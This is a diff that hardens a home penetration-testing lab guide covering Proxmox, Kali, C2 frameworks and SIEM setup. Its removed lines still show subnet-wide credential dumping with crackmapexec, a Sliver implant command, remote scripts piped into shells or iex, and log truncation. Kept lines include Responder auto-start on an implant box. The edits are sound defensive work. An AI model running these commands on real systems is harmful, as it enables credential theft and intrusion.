@@ -936,15 +936,21 @@ tank/
     └── blue-team-logs/    # Centralized log storage
 ```
 
-**NFS Shares for Proxmox**:
+**NFS Shares for Proxmox (restrict clients and preserve root squashing)**:
 ```bash
-# Share ISOs and templates
-zfs set sharenfs="rw=@10.10.10.0/24,no_root_squash" tank/proxmox/isos
-zfs set sharenfs="rw=@10.10.10.0/24,no_root_squash" tank/proxmox/templates
+# Replace these example host addresses and datasets with your actual values.
+# Prefer a dedicated, read-only dataset for ISO/template consumers.
+zfs set sharenfs="ro=@10.10.10.12/32" tank/proxmox/isos
+zfs set sharenfs="ro=@10.10.10.12/32" tank/proxmox/templates
 
-# Share pentest data (mount in attacker VMs)
-zfs set sharenfs="rw=@10.20.20.0/24,no_root_squash" tank/pentest-data
+# Use a dedicated data export and grant write access only to the required VM.
+# Keep the default root_squash behavior; do not set no_root_squash.
+zfs set sharenfs="rw=@10.20.20.10/32" tank/pentest-data
 ```
+
+Use your NAS vendor's current export controls to verify the effective client list,
+root mapping, and file permissions. Do not expose a broad writable export to an
+attacker VM; use a separate, disposable working dataset when writes are required.
 
 **iSCSI Target for High-Performance VM Storage** (Optional):
 ```bash
@@ -975,17 +981,22 @@ zfs set sharenfs="rw=@10.20.20.0/24,no_root_squash" tank/pentest-data
 
 **Deployment Method**:
 ```bash
-# Don't hardcode a version -- Kali images are pruned from the CDN once
-# superseded (this exact 2024.4 URL is already dead). Get the current
-# release name and filename from https://kali.download/base-images/ or
-# the QEMU/Proxmox tab at https://www.kali.org/get-kali/#kali-virtual-machines
+# Download the current QEMU image from Kali's official downloads page:
+# https://www.kali.org/get-kali/#kali-virtual-machines
+# Verify its published checksum/signature before extracting it. The URL above
+# is a landing page, not a direct image URL.
 cd /var/lib/vz/template/iso/
-wget https://www.kali.org/get-kali/#kali-virtual-machines
-7z x kali-linux-2024.4-qemu-amd64.7z
+KALI_ARCHIVE='kali-linux-REPLACE-WITH-VERIFIED-RELEASE-qemu-amd64.7z'
+test -f "$KALI_ARCHIVE" || { echo "Set KALI_ARCHIVE to the verified local download"; exit 1; }
+7z x "$KALI_ARCHIVE"
 
-# Create VM from qcow2 image
+# Set this to the qcow2 file extracted from the verified archive.
+KALI_DISK='kali-linux-REPLACE-WITH-VERIFIED-RELEASE-qemu-amd64.qcow2'
+test -f "$KALI_DISK" || { echo "Set KALI_DISK to the extracted qcow2 image"; exit 1; }
+
+# Create VM from the verified image.
 qm create 200 --name kali-primary --memory 16384 --cores 6 --net0 virtio,bridge=vmbr1,tag=20
-qm importdisk 200 "kali-linux-${KALI_RELEASE}-qemu-amd64.qcow2" local-lvm
+qm importdisk 200 "$KALI_DISK" local-lvm
 qm set 200 --scsihw virtio-scsi-pci --scsi0 local-lvm:vm-200-disk-0
 qm set 200 --boot order=scsi0
 qm set 200 --agent enabled=1
@@ -993,21 +1004,22 @@ qm set 200 --agent enabled=1
 
 **Post-Installation Configuration**:
 ```bash
-# Update system
-sudo apt update && sudo apt full-upgrade -y
+# Update from Kali after taking a VM snapshot. Review the proposed transaction
+# and package removals before accepting the full upgrade.
+sudo apt update
+sudo apt full-upgrade
 
-# Install additional tools from your ULTIMATE-CYBERSECURITY-MASTER-GUIDE
-sudo apt install -y bloodhound crackmapexec impacket-scripts \
-    evil-winrm responder chisel ligolo-ng sliver-client \
-    pipx nuclei subfinder httpx
+# Install only tools needed for this lab, using their current official
+# instructions. Package names differ by Kali release; distinguish
+# ProjectDiscovery httpx from Python HTTPX. Avoid bulk installs on a daily-use
+# workstation.
 
-# Install custom tools
-git clone https://github.com/your-custom-tools /opt/custom
-
-# Mount NFS share for wordlists and tools
-sudo mkdir /mnt/pentest-data
-sudo mount -t nfs truenas-ip:/mnt/tank/pentest-data /mnt/pentest-data
-echo "truenas-ip:/mnt/tank/pentest-data /mnt/pentest-data nfs defaults 0 0" | sudo tee -a /etc/fstab
+# Mount a read-only NFS view for wordlists and reference files.
+# Replace the server/export and mount point with verified local values.
+sudo mkdir -p /mnt/pentest-data
+sudo mount -t nfs -o ro,_netdev truenas-ip:/mnt/tank/pentest-data /mnt/pentest-data
+# Add one reviewed entry to /etc/fstab only after testing the mount.
+# Example options: ro,_netdev,nofail; avoid appending duplicate entries.
 
 # Configure static IP
 sudo nano /etc/network/interfaces
@@ -1029,16 +1041,16 @@ qm snapshot 200 baseline --vmstate 1 --description "Clean Kali install, all tool
 
 **Deployment**:
 ```bash
-# This exact 5.3 URL is already dead -- Parrot prunes old ISOs from the
-# CDN too. Get the current version and filename from
-# https://www.parrotsec.org/download/
+# Download the current ISO from Parrot's official page and verify its
+# published checksum/signature. The page URL is not a direct ISO URL.
 cd /var/lib/vz/template/iso/
-wget https://www.parrotsec.org/download/
+PARROT_ISO='Parrot-security-REPLACE-WITH-VERIFIED-RELEASE_amd64.iso'
+test -f "$PARROT_ISO" || { echo "Set PARROT_ISO to the verified local ISO"; exit 1; }
 
-# Create VM
+# Create the VM using the verified local ISO.
 qm create 201 --name parrot-sec --memory 8192 --cores 4 \
     --net0 virtio,bridge=vmbr1,tag=20 \
-    --cdrom "local:iso/Parrot-security-${PARROT_VERSION}_amd64.iso" \
+    --cdrom "local:iso/$PARROT_ISO" \
     --scsi0 local-lvm:32 --scsihw virtio-scsi-pci
 
 # Start and install via VNC
@@ -1065,19 +1077,14 @@ qm set 202 --ide2 local:iso/virtio-win-0.1.229.iso,media=cdrom
 **Post-Installation Tools**:
 ```powershell
 # Install Chocolatey
-Set-ExecutionPolicy Bypass -Scope Process -Force
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
-iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+# Do not weaken execution policy or execute a remote installer with iex.
+# Follow the official [Chocolatey install guide](https://docs.chocolatey.org/en-us/choco/setup/)
+# from a disposable lab VM, verify the installer provenance, and review its changes.
 
-# Install attacker tools
-choco install -y mimikatz rubeus sharphound bloodhound \
-    powershell-core python3 git vscode \
-    sysinternals processhacker
-
-# PowerShell offensive modules
-Install-Module -Name PowerSploit -Force
-Install-Module -Name Nishang -Force
-Install-Module -Name Empire -Force
+# Use only disposable Windows lab VMs.
+# Do not bypass execution policy or pipe a downloaded installer into iex.
+# Install only reviewed tools from official release channels and verify
+# signatures/checksums; keep retired tools out of the image.
 ```
 
 ### Target VMs
@@ -1089,7 +1096,7 @@ Install-Module -Name Empire -Force
 # Create Windows Server 2019 VM
 # vmbr1 must be a host-only/internal bridge with no physical uplink or route.
 qm create 300 --name dc01-target --memory 16384 --cores 4 \
-    --net0 virtio,bridge=vmbr1,tag=30
+    --net0 virtio,bridge=vmbr1,tag=30 \
     --cdrom local:iso/WinServer2019_Eval.iso \
     --scsi0 local-lvm:80 --scsihw virtio-scsi-pci \
     --ostype win10
@@ -1402,30 +1409,23 @@ cp /mnt/pentest-data/exploits/*.rb ~/.msf4/modules/exploits/custom/
 # Host: 10.20.20.100, Password: P@ssw0rd!
 ```
 
-**Sliver C2** (Open Source Alternative):
-```bash
-# Install on Kali
-curl https://sliver.sh/install | sudo bash
-
-# Start Sliver server
-sliver-server
-
-# Generate implant
-generate --http 10.20.20.10:80 --os windows --arch amd64 --save /tmp/payload.exe
-```
+**Sliver C2** (isolated lab only):
+Use the current [official Sliver installation and release documentation](https://sliver.sh/docs).
+Pin a release, verify its provenance, and inspect the installer before running it.
+Do not pipe downloaded content directly into a privileged shell. Keep the server,
+operator client, and disposable test agents on an isolated host-only lab network.
+Generating or running an implant is an active simulation; do so only against
+disposable lab VMs after verifying they have no route to production or the public
+internet. This guide does not provide a live implant command.
 
 **Empire/Starkiller**:
-```bash
-# Install Empire
-git clone https://github.com/BC-SECURITY/Empire.git /opt/Empire
-cd /opt/Empire
-sudo ./setup/install.sh
-
-# Install Starkiller (GUI)
-wget https://github.com/BC-SECURITY/Starkiller/releases/latest
-chmod +x starkiller-1.11.0.AppImage
-./starkiller-1.11.0.AppImage
-```
+Use the current [Empire](https://github.com/BC-SECURITY/Empire) and
+[Starkiller releases](https://github.com/BC-SECURITY/Starkiller/releases) from
+their official repositories. Select and pin a release compatible with your OS,
+review its installation scripts and required privileges, and verify release
+artifacts before running them. The latest-release page is a browser page, not
+an AppImage download URL. Do not run unreviewed setup scripts with sudo on a
+daily-use or production host.
 
 #### Web Application Testing
 
@@ -1480,12 +1480,19 @@ npm start
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp
 ```
 
-**CrackMapExec**:
+**SMB exposure review (NetExec)**:
+
+CrackMapExec is discontinued; Kali packages its continuation as NetExec (`netexec`). Use the current [Kali package guidance](https://www.kali.org/tools/netexec/) and current NetExec documentation. For an isolated lab, use one disposable target and a synthetic test account; avoid subnet-wide credential-dump commands.
+
 ```bash
-crackmapexec smb 10.30.30.0/24 -u jdoe -p 'Password123!' --shares
-crackmapexec smb 10.30.30.0/24 -u jdoe -p 'Password123!' --sam
-crackmapexec smb 10.30.30.0/24 -u jdoe -H <ntlm> --lsa
+# Install on Kali from its maintained package repository.
+sudo apt install netexec
+
+# Confirm SMB service visibility and review shares on one authorized lab target.
+nxc smb 10.30.30.10 -u "$LAB_USER" -p "$LAB_PASSWORD" --shares
 ```
+
+Set `LAB_USER` and `LAB_PASSWORD` to disposable lab-only credentials using a protected environment or secret store. Do not reuse real passwords or place credentials in shell history.
 
 **Impacket Suite**:
 ```bash
@@ -1609,28 +1616,23 @@ sudo wifite --kill
 
 #### Post-Exploitation
 
-**LinPEAS / WinPEAS**:
-```bash
-# Linux privilege escalation enumeration
-curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+**Privilege-configuration review tools (disposable lab only)**:
 
-# Windows (PowerShell)
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')
-```
-
-**PowerSploit / PowerUp**:
-```powershell
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
-Invoke-AllChecks
-```
+Do not pipe a moving latest download into a shell or execute a script directly
+from a remote URL. For PEASS-ng, download a pinned official release, verify its
+published digest/signature, inspect the script, and run it only in a disposable,
+isolated VM. PowerSploit is archived; avoid installing or running its old
+PowerUp script. Use current, maintained assessment guidance and document the
+exact version and scope of any lab tool.
 
 **Ligolo-ng** (Pivoting):
 ```bash
 # Proxy server on attacker
 ./proxy -selfcert
 
-# Agent on compromised host
-./agent -connect 10.20.20.10:11601 -ignore-cert
+# Agent on a disposable lab host only. Configure certificate trust
+# out of band and verify the proxy certificate; do not disable validation.
+./agent -connect 10.20.20.10:11601
 
 # Create tunnel
 session
@@ -1737,10 +1739,18 @@ vagrant snapshot save baseline
 
 **Install Terraform**:
 ```bash
-wget https://releases.hashicorp.com/terraform/1.6.3/terraform_1.6.3_linux_amd64.zip
-unzip terraform_1.6.3_linux_amd64.zip
-sudo mv terraform /usr/local/bin/
+# Select a currently supported, reviewed Terraform release and your host architecture.
+# Follow HashiCorp's official release-verification instructions before installing.
+TF_VERSION='REPLACE_WITH_REVIEWED_RELEASE'
+curl -fSLO "https://releases.hashicorp.com/terraform/${TF_VERSION}/terraform_${TF_VERSION}_linux_amd64.zip"
+curl -fSLO "https://releases.hashicorp.com/terraform/${TF_VERSION}/terraform_${TF_VERSION}_SHA256SUMS"
+# Verify the signed checksum manifest against HashiCorp's published signing key,
+# then run: sha256sum -c "terraform_${TF_VERSION}_SHA256SUMS" --ignore-missing
+unzip "terraform_${TF_VERSION}_linux_amd64.zip"
+sudo install -m 0755 terraform /usr/local/bin/terraform
 ```
+
+Use HashiCorp's current [release page](https://releases.hashicorp.com/terraform/) and verification guidance; do not install an old pinned example without checking its support status.
 
 **Terraform Configuration** (`main.tf`):
 ```hcl
@@ -1850,7 +1860,7 @@ security-onion ansible_host=10.40.40.10 ansible_user=admin ansible_ssh_private_k
       apt:
         name:
           - bloodhound
-          - crackmapexec
+          - netexec
           - evil-winrm
           - pipx
         state: present
@@ -1917,47 +1927,40 @@ security-onion ansible_host=10.40.40.10 ansible_user=admin ansible_ssh_private_k
 ansible-playbook -i inventory.ini setup-lab.yml
 ```
 
-### Automated Lab Reset Script
+### Manual Lab Reset and Evidence Retention
 
-**Create Bash Script** (`reset-lab.sh`):
+> [!CAUTION]
+> Rolling a VM back to a snapshot discards changes made after that snapshot.
+> Clearing SIEM or sensor data can permanently destroy investigation evidence.
+> Do not run a broad reset or schedule one automatically. Export and protect
+> required logs first, confirm the exact lab host and VM IDs, and use the
+> hypervisor console with the lab owner present.
+
+Before a reset:
+1. Confirm the hypervisor and target VM IDs from the local inventory.
+2. Export any logs, captures, and reports needed for the exercise or audit.
+3. Verify the exact snapshot name for each VM and that rollback is approved.
+4. Stop only the selected disposable VMs and confirm they are powered off.
+5. Roll back and restart one VM at a time; verify the resulting state.
+
+Example commands below are destructive and must be reviewed individually.
+Replace the example ID and snapshot name only after the preflight above:
+
 ```bash
-#!/bin/bash
-# Automated lab reset script
-
-echo "Resetting PNW Pentest Lab..."
-
-# Revert all VMs to baseline snapshot
-VMS=(200 201 202 300 301 310 311 312 320 322 323)
-
-for vm in "${VMS[@]}"; do
-    echo "Reverting VM $vm to baseline snapshot..."
-    qm rollback $vm baseline
-done
-
-# Restart VMs
-for vm in "${VMS[@]}"; do
-    echo "Starting VM $vm..."
-    qm start $vm
-done
-
-# Clear logs on blue team systems
-ssh admin@10.40.40.10 "sudo truncate -s 0 /var/log/suricata/eve.json"
-ssh admin@10.40.40.11 "docker exec splunk /opt/splunk/bin/splunk clean eventdata -f"
-
-# Reset OPNsense firewall rules to default
-# ... add OPNsense API calls if needed
-
-echo "Lab reset complete!"
+qm listsnapshot 200
+qm shutdown 200 --timeout 120
+qm status 200
+# Only after confirming the correct disposable VM and saved evidence:
+qm rollback 200 baseline
+qm start 200
+qm status 200
 ```
 
-**Make Executable and Schedule**:
-```bash
-chmod +x reset-lab.sh
+Do not truncate sensor files or invoke Splunk's destructive clean eventdata
+command as part of reset automation. Preserve logs under the defined retention
+policy; use a separate synthetic lab dataset when a clean dashboard is needed.
 
-# Add to crontab for nightly reset
-crontab -e
-# Add: 0 2 * * * /path/to/reset-lab.sh
-```
+No cron or unattended reset is provided.
 
 ---
 
@@ -2021,9 +2024,12 @@ qm create 411 --name splunk --memory 8192 --cores 2 \
     --cdrom local:iso/ubuntu-22.04-server.iso \
     --scsi0 local-lvm:100
 
-# Install Ubuntu, then Splunk
-wget -O splunk.deb 'https://www.splunk.com/en_us/download/splunk-enterprise.html'
-sudo dpkg -i splunk.deb
+# Install Ubuntu, then download the exact Linux package for this VM's architecture
+# from the official Splunk download portal. This portal page is not a .deb URL.
+# Verify the package's published integrity data before installing it.
+SPLUNK_DEB='/path/to/verified/splunk-enterprise-package.deb'
+test -f "$SPLUNK_DEB" || { echo "Set SPLUNK_DEB to the verified package"; exit 1; }
+sudo dpkg -i "$SPLUNK_DEB"
 sudo /opt/splunk/bin/splunk start --accept-license
 sudo /opt/splunk/bin/splunk enable boot-start
 ```
@@ -2045,9 +2051,11 @@ Install-WindowsFeature -Name Windows-EventCollector
 
 On Linux targets:
 ```bash
-# Install Splunk forwarder
-wget -O splunkforwarder.deb 'https://www.splunk.com/en_us/download/universal-forwarder.html'
-sudo dpkg -i splunkforwarder.deb
+# Download the exact Universal Forwarder package for this host from Splunk's
+# official portal and verify its published integrity data; do not wget the HTML page.
+SPLUNK_UF_DEB='/path/to/verified/splunk-universal-forwarder-package.deb'
+test -f "$SPLUNK_UF_DEB" || { echo "Set SPLUNK_UF_DEB to the verified package"; exit 1; }
+sudo dpkg -i "$SPLUNK_UF_DEB"
 sudo /opt/splunkforwarder/bin/splunk start --accept-license
 sudo /opt/splunkforwarder/bin/splunk add forward-server 10.40.40.11:9997
 sudo /opt/splunkforwarder/bin/splunk add monitor /var/log
@@ -2081,10 +2089,12 @@ qm create 412 --name elk-stack --memory 8192 --cores 2 \
     --cdrom local:iso/ubuntu-22.04-server.iso \
     --scsi0 local-lvm:100
 
-# Install Docker and Docker Compose
-curl -fsSL https://get.docker.com -o get-docker.sh
-sudo sh get-docker.sh
-sudo apt install docker-compose
+# Install Docker Engine and the Compose plugin from Docker's signed apt repository;
+# follow the current official Ubuntu instructions for repository/key setup and package versions.
+# Avoid the convenience script on persistent hosts. Docker-published ports can bypass
+# some host firewall rules, so review the network exposure before starting services.
+# https://docs.docker.com/engine/install/ubuntu/
+# Install docker-ce, docker-ce-cli, containerd.io, docker-buildx-plugin, docker-compose-plugin
 
 # Create docker-compose.yml
 cat <<EOF > docker-compose.yml
@@ -2183,30 +2193,21 @@ qm create 413 --name wazuh --memory 8192 --cores 4 \
     --cdrom local:iso/ubuntu-22.04-server.iso \
     --scsi0 local-lvm:100
 
-# Install Wazuh
-curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
-sudo bash wazuh-install.sh -a
+# Install Wazuh from the current official quickstart:
+# https://documentation.wazuh.com/current/quickstart.html
+# Select a supported, pinned release and verify the downloaded installer
+# against the published checksum/signature before running it.
+# Review the script and its privileges; do not use the obsolete 4.7 URL.
 ```
 
 **Deploy Agents on Target VMs**:
 
-Linux:
-```bash
-curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
-echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list
-apt-get update
-WAZUH_MANAGER="10.40.40.13" apt-get install wazuh-agent
-systemctl daemon-reload
-systemctl enable wazuh-agent
-systemctl start wazuh-agent
-```
-
-Windows:
-```powershell
-Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi -OutFile wazuh-agent.msi
-msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER="10.40.40.13"
-NET START WazuhSvc
-```
+Linux and Windows agents:
+Follow the current official [Wazuh agent deployment guide](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/index.html).
+Use the same supported, pinned release as the manager, verify package signatures,
+and set the manager address to the lab-only Wazuh host. Before adding a Linux
+repository entry, check for an existing entry rather than appending duplicates.
+Do not use the obsolete 4.7.0 Windows MSI URL shown in older guides.
 
 **Custom Rules for Pentest Detection**:
 ```xml
@@ -2306,11 +2307,19 @@ sudo tcpdump -i br0 -w /mnt/captures/capture-$(date +%Y%m%d-%H%M%S).pcap
 sudo tshark -i br0 -f "tcp port 445 or tcp port 139" -w smb-traffic.pcap
 ```
 
-**Automated Packet Rotation**:
+**Bounded Packet Rotation**:
 ```bash
-# Cron job for daily PCAP rotation
-0 0 * * * tcpdump -i br0 -G 86400 -w /mnt/captures/capture-%Y%m%d-%H%M%S.pcap -Z root
+# Size-based ring buffer: approximately 7 files x 100 MiB maximum.
+# Run under a reviewed service account with write access to /mnt/captures.
+sudo tcpdump -i br0 -C 100 -W 7 -w /mnt/captures/capture.pcap
 ```
+
+The `-C`/`-W` pair limits this capture process to a seven-file ring buffer;
+it wraps and overwrites its oldest file. It does not provide daily rotation.
+Check [tcpdump's manual](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
+for the installed version's exact behavior. Confirm disk quotas and evidence
+retention requirements first; export any capture that must be preserved before
+the ring buffer overwrites it.
 
 #### ZimaBlade - Covert Implant Simulation
 
@@ -2326,7 +2335,7 @@ sudo tshark -i br0 -f "tcp port 445 or tcp port 139" -w smb-traffic.pcap
 **Setup**:
 ```bash
 # Install pentesting tools
-sudo apt install -y nmap crackmapexec evil-winrm responder
+sudo apt install -y nmap netexec evil-winrm responder
 
 # Auto-start Responder on boot
 sudo systemctl enable responder
